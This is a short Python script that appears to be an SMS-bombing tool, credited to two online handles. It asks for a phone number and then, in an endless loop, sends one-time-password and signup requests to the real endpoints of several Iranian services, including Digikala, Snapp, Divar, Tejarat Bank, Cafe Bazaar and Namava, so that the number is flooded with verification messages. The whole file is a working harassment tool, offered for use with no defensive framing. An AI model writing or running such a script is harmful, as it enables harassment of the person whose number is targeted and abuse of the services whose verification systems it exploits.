import requests

green = '\033[32m' 

red = '\033[31m' 

blue = '\033[36m' 

pink = '\033[35m' 

yellow = '\033[93m' 

darkblue = '\033[34m' 

white = '\033[00m'

phone = input(yellow+"yor phone number not 0 >>> ")

sum = 0

link = f"https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone={phone}"

api_divar = 'https://api.divar.ir/v5/auth/authenticate'

print(red+"@mamadcoder1 \n @mrghost_0")

api_m = "https://mbt.tejaratbank.ir/api/card-registration/verify"

api_h = "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest"

man = data={"properties":{"language":2,"clientID":"oqkkpy7muphuxu69p7g1z7tolyir4p7z","deviceID":"oqkkpy7muphuxu69p7g1z7tolyir4p7z","clientVersion":"web"},"singleRequest":{"getOtpTokenRequest":{"username":f"98{phone}"}}}

hj = data={"remember[email_phone]" : "0"+phone}

while True:

    

    requests.post("https://api.digikala.com/v1/user/authenticate/",json={"backUrl":"/","username":f"0{phone}","otp_call":False})

    print(green+"[+]",blue+f"send digi phone [{phone}] \n {yellow}")

    requests.post(f"https://api.torob.com/v4/user/phone/send-pin/?phone_number=0{phone}")

    print(green+"[+]",blue+f"send torob phone  [{phone}] \n {yellow}")

    

    requests.post(link,data={"cellphone":f"0{phone}"})

    print(green+"[+]",blue+f"send snapp phone [{phone}] \n")

    

    requests.post(api_divar,json={'phone':f"0{phone}"})

    print(green+"[+]",blue+f"send divar phone [{phone}] \n")

    

    requests.post(api_m,hj)

    print(green+"[+]",blue+f"send tejaratbank phone [{phone}] \n")

    

    

    requests.post(api_h,man)

    print(green+"[+]",blue+f"send cafebazaar phone [{phone}] \n")

    

    requests.post("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",data={"UserName":f"+98{phone}"})

    print(green+"[+]",blue+f"send namava phone [{phone}] \n")

    

    

    

    

    

    

    

    

    

    
